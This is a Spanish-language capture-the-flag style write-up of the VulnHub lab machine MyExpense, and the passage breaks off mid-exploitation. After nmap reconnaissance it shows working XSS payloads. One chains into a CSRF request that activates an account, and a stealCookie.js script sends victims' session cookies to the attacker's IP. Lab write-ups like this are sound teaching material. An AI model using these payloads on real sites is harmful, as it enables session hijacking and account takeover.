---
layout: single
title: MyExpense - VulnHub Machine
excerpt: "Máquina linux de la plataforma VulnHub, donde se puede practicar XSS y SQLI"
date: 2023-10-25
classes: wide
header:
  teaser: /assets/images/vh-writeup-myexpense/portada-myexpense.png
  teaser_home_page: true
  icon: /assets/images/vulhub.png
categories:
  - VulnHub
tags:
  - sql
  - sqli
  - xss
  - session
  - hijacking
  - linux
---
![](/assets/images/vh-writeup-myexpense/portada-myexpense.png)

MyExpense es una máquina linux de [VulnHub](https://www.vulnhub.com/entry/myexpense-1,405/#top) y a diferencia de las máquinas de [HackTheBox](https://www.hackthebox.com/), su finalidad no la de llegar a ser root en el servidor comprometido.

En este caso, somos un "Samuel Lamotte", exempleado de una empresa la cual nos ha despedido y encima, no nos han tramitado un pago que nos deben. Nuestro objetivo será infiltrarnos en el sistema para que el pago se lleve a cabo.

La única pista que nos dan es: ```samuel/fzghn4lw```, lo cual parecen unas credenciales.

## Índice
* [Fase de reconocimiento](#reconocimiento)
  * [Reconociento de puertos y servicios](#reconocimiento)
  * [Reconocimiento de la página web](#reconocimiento-web)
* [Fase de explotación](#explotacion)
  * [Nos logeamos como slamotte](#slamotte)
  * [Nos convertimos en mriviere](#mriviere)
  * [Nos convertimos en pboundi](#pboundi)

<a id="reconocimiento"></a>
## Fase de reconocimiento

### Reconocimiento de puertos y servicios

Empezaremos utilizando nmap para descubrir los puertos abiertos accesibles(digo accesibles ya que la máquina puede tener más puertos abiertos pero que solo son accesibles desde la misma).
```bash
nmap -p- --open -sS --min-rate 5000 -Pn -n -v 10.0.2.9 -oG allPort
```
allPorts:

```bash 
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.0.2.9 ()   Status: Up
Host: 10.0.2.9 ()   Ports: 80/open/tcp//http///, 37761/open/tcp/////, 41843/open/tcp/////, 42307/open/tcp/////, 53407/open/tcp///// Igno
red State: closed (65530)
# Nmap done at Mon Oct 23 18:02:42 2023 -- 1 IP address (1 host up) scanned in 2.72 seconds
```

Una vez escaneados los puertos, escanearemos más en profundidad para ver que servicios usan y sus respectivas versiones.

```bash
nmap -p80,37761,41843,42307,53407 -sCV 10.0.2.9 -v -oN targeted
# Nmap 7.93 scan initiated Mon Oct 23 18:04:16 2023 as: nmap -p80,37761,41843,42307,53407 -sCV -v -oN targeted 10.0.2.9
Nmap scan report for 10.0.2.9 (10.0.2.9)
Host is up (0.00069s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Futura Business Informatique GROUPE - Conseil en ing\xC3\xA9nierie
|_http-favicon: Unknown favicon MD5: 9B033BAF87652377BA32FF57F736E439
|_http-server-header: Apache/2.4.25 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/admin/admin.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
37761/tcp open  http    Mongoose httpd
|_http-title: Site doesn't have a title (text/plain).
| http-methods: 
|_  Supported Methods: GET HEAD POST
41843/tcp open  http    Mongoose httpd
|_http-title: Site doesn't have a title (text/plain).
| http-methods: 
|_  Supported Methods: GET HEAD POST
42307/tcp open  http    Mongoose httpd
|_http-title: Site doesn't have a title (text/plain).
| http-methods: 
|_  Supported Methods: GET HEAD POST
53407/tcp open  http    Mongoose httpd
|_http-title: Site doesn't have a title (text/plain).
| http-methods: 
|_  Supported Methods: GET HEAD POST

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct 23 18:04:23 2023 -- 1 IP address (1 host up) scanned in 7.26 seconds
```

Como podemos ver, el servidor tiene el puerto 80 con el servicio *http*. Es más, ha encontrado una ruta llamada ```/admin/admin```.php que tiene una cookie de *PHPSESSION* que tiene el http-only deshabilitado.

Esta flag puede ser crucial si se produce un [XSS (Cross Site Scripting)](https://owasp.org/www-community/attacks/xss/), ya que nos puede permitir hacer un [Session Hijacking](https://en.wikipedia.org/wiki/Session_hijacking).


<a id="reconocimiento-web"></a>
### Reconocimiento de la página web

Podemos acceder a la página ```/admin/admin.php``` sin logearnos en la página y podemos ver una serie de usuario y si están activos o no.

<a id="explotacion"></a>

## Fase de explotación

Entre estos usuarios podemos ver al nuestro: slamotte. Sin embargo, si intentamos logearnos nos dice que no podemos entrar en esta porque está inactiva.

Por lo tanto intentamos crear una nueva, pero por defecto aparece inactiva.

Como el login nos permite escribir un input que luego se refleja en ```/admin/admin.php```, intentamos probar un **XSS**. Creamos un usuario con el FirstName: ```<marquee>Hacked</marquee>```. Cuando vamos a *admin.php* podemos ver que se mueve el texto. Por lo tanto, estamos ante un **XSS**.

Si le damos a activar una cuenta, nos redirigirá a una página diciendo que no tenemos privilegios para hacerlo. Esta petición se hace por *GET* y podemos ver en la URL que se tramita de la siguiente manera: 
```
http://<ip de la maquina>/admin/admin.php?id=11&status=active
```
El campo id es el id del usuario al que queremos activar y el status es al estado al que queremos cambiarlo.

<a id="slamotte"></a>
### Nos logeamos como en slamotte

Si logramos que el administrador realice esta petición activará la cuenta. Esto lo podremos conseguir derivando el **XSS** anterior en un [CSRF(Cross Site Request Forgery)](https://owasp.org/www-community/attacks/csrf).

La idea es que vamos a hacer que el administrador cargue un código malicioso *js* gracias al **XSS**. Este script va a realizar una petición XML a la URL de activarnos la cuenta con suerte de que la ejecute un administrador.

pwned.js:

```js
var request = new XMLHttpRequest();
request.open('GET', 'http://<ip de la máquina>/admin/admin.php?id=11&status=active');
request.send();
```

Ahora creamos un usuario con el siguiente FirstName:
```html
<script src="http://<mi ip>/pwned.js"></script>
```

Iniciamos un servicio *http* en la carpeta en la que tenemos el archivo. Yo lo hago con python desde consola de la siguiente manera:
```py
python -m http.server 80
```

En un momento dado, vemos que hemos recibido una petición *GET* del recurso ```/pwned.js```. Si recargamos la página vemos que el usuario **slamotte** está activo y nos logueamos con las credenciales que teníamos. 

![](/assets/images/vh-writeup-myexpense/slamotte.png)

Una vez como slamotte, podemos ver una especie de chat donde varios usuarios han escrito mensajes. 

Si nos vamos al apartado del perfil, podemos ver quién es nuestro mánager: Manon Riviere (mriviere)

![](/assets/images/vh-writeup-myexpense/whoisManager.png)

Si alguien tiene que tramitar nuestro pago, por lógica tiene que ser él. Por lo tanto tenemos que ver la forma de que nos acepte el pago.

Si intentamos inyectar html en el chat, podremos observar que se produce un *XSS*. La idea aquí será robar las cookie de sesión de la persona que vea el mensaje y probar suerte de que mriviere caiga en nuestra trampa.

Para ello referenciaré un script en *js* llamado ```stealCookie.js```:

```html
<script src="http://<mi ip>/stealCookie.js"></script>
```

stealCookie.js:
```js
var request = new XMLHttpRequest();
request.open('GET', 'http://<mi ip>:4646/cookie=' + document.cookie);
request.send();
```

En este código, se tramita una petición *GET* a nuestra ip con un parámetro llamado cookie donde irá la cookie de la víctima que ejecute este *js*.

> Como se puede observar, esta vez uso el puerto 4646. Esto se debe a que el usuario administrador que visita continuamente a la página ```admin/admin.php``` que nos activó la cuenta de slamotte está continuamente haciendo una petición a nuestro puerto 80. Así que por simplificación usaremos otro puerto.

Una vez hecho esto, obtendremos una serie de cookies de diferentes usuarios. Iremos probando una a una hasta dar con **mriviere**.

![](/assets/images/vh-writeup-myexpense/mriviereReport.png)

Aquí podemos ver la petición del pago y le damos a aceptar. Pero esto no es suficiente, todavía lo tiene que revisar el superior de este usuario. Si nos vamos a su usuario lo encontraremos:

![](/assets/images/vh-writeup-myexpense/whoisManagerOfManager.png)

En las cookies anteriores se encuentra este usuario. Sin embargo, como es un administrador, aparece una alerta de que no pueden haber dos